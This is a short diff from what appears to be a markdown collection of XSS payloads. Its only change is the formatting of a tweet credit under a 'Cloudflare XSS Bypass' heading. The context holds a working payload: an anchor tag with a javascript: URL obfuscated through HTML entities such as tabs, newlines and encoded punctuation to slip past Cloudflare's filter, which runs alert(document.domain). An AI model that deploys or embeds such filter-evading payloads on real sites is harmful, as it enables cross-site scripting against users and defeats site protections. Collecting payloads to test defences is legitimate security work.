@@ -2,7 +2,7 @@
 
 ## Cloudflare XSS Bypass
 
-[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)
+*[Tweet](https://twitter.com/aisecureme/status/1240354605520678913) By [AISECUREME](https://twitter.com/aisecureme)*
 
 ```html
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
